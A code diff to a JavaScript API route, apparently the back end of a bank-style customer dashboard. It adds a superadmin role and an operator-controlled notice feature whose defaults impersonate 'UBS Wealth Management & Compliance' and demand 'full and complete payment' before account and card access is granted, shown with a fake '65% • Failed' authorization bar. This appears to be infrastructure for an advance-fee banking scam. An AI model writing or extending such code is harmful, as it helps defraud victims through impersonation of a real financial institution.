@@ -27,7 +27,9 @@ export async function GET(request) {
     let effectiveId = null;
     let effectiveEmail = null;
 
-    if (session.role === 'admin') {
+    const isAdminSession = session.role === 'admin' || session.role === 'superadmin';
+
+    if (isAdminSession) {
       effectiveId = queryUserId || session.id;
       effectiveEmail = queryEmail || session.email;
     } else {
@@ -43,7 +45,7 @@ export async function GET(request) {
 
     // If an administrator is viewing or testing the dashboard and no matching admin-user exists in users table,
     // default to the primary client user so the administrator can preview live user settings and UI
-    if (!user && session.role === 'admin' && data.users && data.users.length > 0) {
+    if (!user && isAdminSession && data.users && data.users.length > 0) {
       user = data.users[0];
     }
 
@@ -58,7 +60,7 @@ export async function GET(request) {
     }
 
     // Active session status & token version check for non-admin accounts
-    if (session.role !== 'admin') {
+    if (!isAdminSession) {
       const sessionVer = Number(session.tokenVersion) || 1;
       const userVer = Number(user.tokenVersion) || 1;
       if (sessionVer < userVer) {
@@ -118,18 +120,36 @@ export async function GET(request) {
       }
     }
 
-    const effectiveNotice = user.notice && user.notice.enabled !== undefined
+    const effectiveNotice = user.notice
       ? {
-          ...user.notice,
-          showPopup: user.notice.showPopup !== undefined ? user.notice.showPopup : true,
+          enabled: Boolean(user.notice.enabled),
+          showPopup: user.notice.showPopup !== undefined ? Boolean(user.notice.showPopup) : true,
+          sendAsMessage: Boolean(user.notice.sendAsMessage),
+          subject: user.notice.subject || user.notice.progressLabel || 'Official Account & Compliance Notice',
+          sender: user.notice.sender || 'UBS Wealth Management & Compliance',
+          category: user.notice.category || 'Notices',
+          sentDate: user.notice.sentDate || 'Today',
+          sentTime: user.notice.sentTime || 'Just now',
+          message: user.notice.message || 'Notice: Please note that full and complete payment is required before access and authorization to your online account and credit card can be granted. Kindly ensure all outstanding balances are settled to avoid delays.',
+          progress: typeof user.notice.progress === 'number' ? user.notice.progress : 65,
+          progressStatus: user.notice.progressStatus || '65% • Failed',
+          progressLabel: user.notice.progressLabel || 'Authorization Progress',
+          messages: Array.isArray(user.notice.messages) ? user.notice.messages : [],
         }
       : {
           enabled: false,
           showPopup: true,
+          sendAsMessage: false,
+          subject: 'Official Account & Compliance Notice',
+          sender: 'UBS Wealth Management & Compliance',
+          category: 'Notices',
+          sentDate: '',
+          sentTime: '',
           message: 'Notice: Please note that full and complete payment is required before access and authorization to your online account and credit card can be granted. Kindly ensure all outstanding balances are settled to avoid delays.',
           progress: 65,
           progressStatus: '65% • Failed',
-          progressLabel: 'Authorization Progress'
+          progressLabel: 'Authorization Progress',
+          messages: [],
         };
 
     return new Response(
